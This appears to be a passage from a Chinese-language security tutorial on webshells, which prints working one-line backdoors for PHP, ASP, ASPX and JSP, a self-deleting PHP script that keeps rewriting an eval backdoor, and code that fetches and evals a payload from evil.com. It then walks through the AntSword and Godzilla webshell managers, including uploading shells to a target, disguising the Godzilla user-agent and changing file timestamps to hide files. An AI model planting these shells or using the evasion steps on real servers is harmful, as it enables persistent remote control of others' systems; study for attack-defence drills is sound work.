+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://evil.com/evil_payload.txt&#x27;</span>;  <span class="comment">// 远程URL</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);  <span class="comment">// 获取远程URL中的数据</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$data</span>);  <span class="comment">// 执行获取到的数据</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="常见一句话木马"><a href="#常见一句话木马" class="headerlink" title="常见一句话木马"></a>常见一句话木马</h2><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;value&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[value]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[email]/e&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;h&#x27;</span>],<span class="string">&quot;error&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval request (&quot;value&quot;)%&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% execute(request(&quot;value&quot;)) %&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="aspx"><a href="#aspx" class="headerlink" title="aspx"></a>aspx</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot; %&gt;&lt;% eval(Request.Item[&quot;value&quot;]) %&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h3><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="keyword">if</span>(request.getParameter(<span class="string">&quot;f&quot;</span>)!=<span class="literal">null</span>)(<span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(application.getRealPath(<span class="string">&quot;\\&quot;</span>)+request.getParameter(<span class="string">&quot;f&quot;</span>))).write(request.getParameter(<span class="string">&quot;t&quot;</span>).getBytes());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h2><p><code>WebShell</code>内存马是一种常用的无文件攻击手段,它将恶意后门和木马写入内存并执行,以实现对<code>Web</code>服务器的远程控制.随着攻防演练的热度不断上升,攻击和防守之间的博弈日益激烈,流量分析、<code>EDR</code>等专业安全设备被蓝方广泛使用,传统的基于文件的<code>WebShell</code>或以文件形式驻留的后门越来越容易被检测到,因此内存马的使用越来越普遍.</p>
+<p><code>PHP</code>内存马是一种常见的内存马类型,在线下<code>AWD</code>比赛中经常被使用.在蚁剑等工具中也提供了专门的插件来实现一键注入内存马.其原理相对简单,利用<code>PHP</code>的特性通过反复写入一个木马代码片段来实现无法删除的目的.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>); <span class="comment">// 忽略用户中止请求,确保脚本继续执行</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>); <span class="comment">// 设置脚本执行时间为无限制,避免因超时而中断</span></span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>); <span class="comment">// 删除当前脚本文件,确保脚本只执行一次</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;Shell.php&#x27;</span>; <span class="comment">// 定义要写入的文件名,这里是Shell.php</span></span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>; <span class="comment">// 定义要写入文件的恶意代码,用于远程执行命令</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123; <span class="comment">// 进入无限循环</span></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$code</span>); <span class="comment">// 将恶意代码写入文件</span></span><br><span class="line">    <span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>); <span class="comment">// 程序休眠5000微秒,让循环间隔一定时间</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码会创建一个名为<code>Shell.php</code>的文件,并将恶意代码写入其中.通过设置忽略用户中止、无限制的执行时间和在每次循环中删除当前文件来达到持久化的效果.然而实际上,这种方法仍然会有文件落地,只是管理员难以删除或删除不完全而已.</p>
+<p>更具有代表性的是<code>Java</code>内存马.它是一种常见的无文件攻击手段,在目标系统的内存中直接加载并执行恶意代码,从而控制目标系统.相比于传统的基于文件的<code>WebShell</code>或以文件形式驻留的后门,<code>Java</code>内存马更加隐蔽,很难被安全设备和防御措施检测到.</p>
+<h2 id="WebShell管理工具的使用"><a href="#WebShell管理工具的使用" class="headerlink" title="WebShell管理工具的使用"></a>WebShell管理工具的使用</h2><h3 id="蚁剑-AntSword"><a href="#蚁剑-AntSword" class="headerlink" title="蚁剑(AntSword)"></a>蚁剑(AntSword)</h3><h4 id="蚁剑的下载"><a href="#蚁剑的下载" class="headerlink" title="蚁剑的下载"></a>蚁剑的下载</h4><p>蚁剑本体</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/AntSwordProject/antSword</span><br><span class="line">https://gitee.com/AntSwordProject/antSword</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑加载器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/AntSwordProject/AntSword-Loader</span><br><span class="line">https://gitee.com/AntSwordProject/AntSword-Loader</span><br></pre></td></tr></table></figure>
+
+<h4 id="蚁剑的安装"><a href="#蚁剑的安装" class="headerlink" title="蚁剑的安装"></a>蚁剑的安装</h4><p>蚁剑从<code>v2.0.0-beta</code>版本开始引入了加载器这个概念,需要下载对应平台的加载器运行当前的开发板和发行版源代码.</p>
+<p>打开加载器-&gt;点击初始化,选择蚁剑<strong>源代码目录</strong>如<code>antSword-2.1.14/</code>目录</p>
+<p>注意：<strong>！目录所在的路径不要有中文！</strong><br>       可以如<code>D:\AntSword-Loader-v4.0.3-win32-x64</code></p>
+<p>不能如<code>D:\工具\AntSword-Loader-v4.0.3-win32-x64</code>这样含有中文</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161200779.png" data-fancybox="true"/></div></div>
+
+<p>初始化完成后再次打开蚁剑加载器 <code>AntSword.exe</code> 即可使用</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161200632.png" data-fancybox="true"/></div></div>
+
+<h4 id="蚁剑界面"><a href="#蚁剑界面" class="headerlink" title="蚁剑界面"></a>蚁剑界面</h4><p>点击<code>AntSword</code>菜单内有<code>关于程序</code>、<code>语言设置</code>、<code>代理设置</code>、<code>显示设置</code>等基础功能</p>
+<p>编码设置可创建编码器,在页面<code>编辑</code>处粘贴代码点击保存,这样在添加<code>Shell</code>或者编辑<code>Shell</code>配置时,就可以选择&#x3D;&#x3D;编码器&#x2F;解码器&#x3D;&#x3D;了.</p>
+<p>插件市场可添加开发者提供的多功能插件</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161200828.png" data-fancybox="true"/></div></div>
+
+
+
+<h4 id="蚁剑-AntSword-的使用"><a href="#蚁剑-AntSword-的使用" class="headerlink" title="蚁剑(AntSword)的使用"></a>蚁剑(AntSword)的使用</h4><h5 id="代理设置"><a href="#代理设置" class="headerlink" title="代理设置"></a>代理设置</h5><p>点击<code>AntSword</code>-&gt;<code>代理设置</code>,可设置代理</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161200821.png" data-fancybox="true"/></div></div>
+
+<h5 id="添加Shell"><a href="#添加Shell" class="headerlink" title="添加Shell"></a>添加Shell</h5><p>界面右键添加数据</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161200940.png" data-fancybox="true"/></div></div>
+
+<h5 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h5><p>点击<code>AntSowrd</code>-&gt;<code>插件市场</code>在<code>设置中心</code>-&gt;<code>设置中文</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161200421.png" data-fancybox="true"/></div></div>
+
+<p>自行在远程仓库下载插件即可,插件在主页处右键选择使用</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161201718.png" data-fancybox="true"/></div></div>
+
+<h3 id="哥斯拉-Godzilla"><a href="#哥斯拉-Godzilla" class="headerlink" title="哥斯拉(Godzilla)"></a>哥斯拉(Godzilla)</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>哥斯拉(<code>Godzilla</code>)是继菜刀、蚁剑、冰蝎之后出现的一款优秀的<code>WebShell</code>管理工具,由<code>JAVA</code>语言开发,特点有：</p>
+<ul>
+<li>全部类型的<code>Shell</code>能绕过市面大部分的静态查杀</li>
+<li>流量加密能绕过市面绝大部分的流量<code>Waf</code></li>
+<li><code>Godzilla</code>自带的插件非常强大,具有内网渗透能力</li>
+</ul>
+<p>地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/BeichenDream/Godzilla</span><br></pre></td></tr></table></figure>
+
+<p>运行环境</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. JavaDynamicPayload -&gt; java1.0及以上</span><br><span class="line">2. CShapDynamicPayload -&gt; .net2.0及以上</span><br><span class="line">3. PhpDynamicPayload -&gt; 4.3.0及以上</span><br><span class="line">4. AspDynamicPayload -&gt; 全版本</span><br></pre></td></tr></table></figure>
+
+<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>打开哥斯拉前需安装<code>JDK1.8</code>以上环境,之后双击<code>Godzilla.jar</code>打开,然后会在同目录下生成<code>data.db</code>数据库存放数据</p>
+<h5 id="生成WebShell"><a href="#生成WebShell" class="headerlink" title="生成WebShell"></a>生成WebShell</h5><p>点击<code>管理</code>-&gt;<code>生成</code>生成所需的<code>WebShell</code>,哥斯拉支持<code>JSP</code>、<code>PHP</code>、<code>Aspx</code>等多种载荷,<code>JAVA</code>和<code>C#</code>的载荷原生实现<code>AES</code>加密,<code>PHP</code>使用或加密.生成时需要记住自己的生成配置用以链接时用.</p>
+<p>如下,有效载荷有<code>ASP</code>、<code>JAVA</code>、<code>PHP</code>、<code>C#</code>(<code>CShap</code>)几种,加密器有<code>Base64</code>、<code>RAW</code>、<code>XOR_Base64</code>几种</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161201316.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161201588.png" data-fancybox="true"/></div></div>
+
+<h5 id="连接WebShell"><a href="#连接WebShell" class="headerlink" title="连接WebShell"></a>连接WebShell</h5><p>上述操作生成一个文件,上传到目标服务器,点击<code>目标</code>,设置基础配置连接该<code>WebShell</code>,配置需要与生成的<code>WebShell</code>一致.</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161201696.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161201304.png" data-fancybox="true"/></div></div>
+
+<p>添加后右键<code>进入</code>即可进入<code>Shell</code>管理界面</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161201547.png" data-fancybox="true"/></div></div>
+
+<h5 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h5><p>连接<code>WebShell</code>时可选择代理,可以设置<strong>HTTP代理</strong>与<code>Burpsuite</code>联动,把哥斯拉流量发送到<code>Burpsuite</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161201015.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161201307.png" data-fancybox="true"/></div></div>
+
+<h5 id="请求配置"><a href="#请求配置" class="headerlink" title="请求配置"></a>请求配置</h5><p>添加目标时,点击请求配置,可修改协议头(包含<code>UA</code>、<code>Accept</code>、<code>Accept-Language</code>三个弱特征),哥斯拉默认的这三项和正常的浏览器有部分差异(<code>UA</code>中含有<code>Godzilla</code>关键字),属于弱特征,可根据自身需求修改,如这里将<code>UA</code>修改成浏览器使用的<code>UA</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161201453.png" data-fancybox="true"/></div></div>
+
+<h4 id="配置信息"><a href="#配置信息" class="headerlink" title="配置信息"></a>配置信息</h4><p>点击会有两个配置：<code>程序配置插件配置</code></p>
+<p>其中插件配置可添加和移除本地第三方哥斯拉插件</p>
+<p>程序配置则可自行修改部分特征,全局协议头就是一个弱特征,全局代理可设置<code>HTTP</code>和<code>SOCKS</code>代理,这里可以与<code>Burpsuite</code>与联动</p>
+<h5 id="全局协议头"><a href="#全局协议头" class="headerlink" title="全局协议头"></a>全局协议头</h5><p>请求配置中为单条设置,此处为全局设置,修改完点击<code>修改</code>按钮</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161201169.png" data-fancybox="true"/></div></div>
+
+<h5 id="全局代理"><a href="#全局代理" class="headerlink" title="全局代理"></a>全局代理</h5><p>设置代理中为单条设置,此处为全局设置</p>
+<h5 id="字体设置"><a href="#字体设置" class="headerlink" title="字体设置"></a>字体设置</h5><p>修改字体格式和大小,<code>你好Hello</code>为修改后的字体与大小,重启程序后生效</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161201036.png" data-fancybox="true"/></div></div>
+
+<h5 id="核心配置"><a href="#核心配置" class="headerlink" title="核心配置"></a>核心配置</h5><p>上帝模式开启会使文件管理复杂化,经测试不开启会导致删除文件、新建文件夹、执行等操作出现问题</p>
+<h5 id="大文件配置"><a href="#大文件配置" class="headerlink" title="大文件配置"></a>大文件配置</h5><p>可设置重试次数和单次上传、下载文件大小,字节单位为<code>k</code>,<code>1M</code>&#x3D;<code>1000000K</code>,若上传或下载的文件较大可自行设置所需大小.</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161201073.png" data-fancybox="true"/></div></div>
+
+<h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><h5 id="基础信息"><a href="#基础信息" class="headerlink" title="基础信息"></a>基础信息</h5><p>哥斯拉特性是会根据语言的不同显示不同的功能界面,以<code>PHP</code>的<code>WebShell</code>为例,基础信息中含有该主机的系统及版本、当前用户、外连IP与端口、网站根目录、<code>PHP</code>版本等信息</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161202594.png" data-fancybox="true"/></div></div>
+
+<p>Linux主机比<code>Windows</code>多一个<code>PPs</code>模块,功能为查看进程<strong>可能因docker的问题并没有获取到进程</strong></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161202995.png" data-fancybox="true"/></div></div>
+
+<h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><p>默认调用的cmd窗口,<code>cmd /c &quot;&#123;command&#125;&quot; 2&gt;&amp;1</code>,若为Linux主机则为<code>/bin/bash</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161202922.png" data-fancybox="true"/></div></div>
+
+<h5 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h5><p>同其他<code>WebShell</code>工具类似,直接拖动文件放进去即可上传,选择文件或文件夹点击右键,可选择上传、下载、查看属性、新建文件、新建文件夹、编辑器打开、查看属性等操作</p>
+<p>哥斯拉的文件管理创新点在于远程下载、执行、大文件上传、大文件下载几块内容,许多<code>WebShell</code>管理工具不支持大文件的上传和下载,安全人员只能通过文件分割方式分块上传；另外,哥斯拉支持直接执行文件,而不必再在命令窗口中输入命令执行.</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161202842.png" data-fancybox="true"/></div></div>
+
+<p>可直接编辑文件,并可选择编码类型进行保存</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161202491.png" data-fancybox="true"/></div></div>
+
+<p>选择<code>文件属性</code>,可对文件路径、文件权限、文件修改时间进行修改,用于隐藏文件</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161202079.png" data-fancybox="true"/></div></div>
+
+<h5 id="数据库管理"><a href="#数据库管理" class="headerlink" title="数据库管理"></a>数据库管理</h5><p>在数据库管理中哥斯拉会先从容器中加载可用的<code>jdbc</code>,如果没有就通过内存加载jar驱动来链接数据库</p>
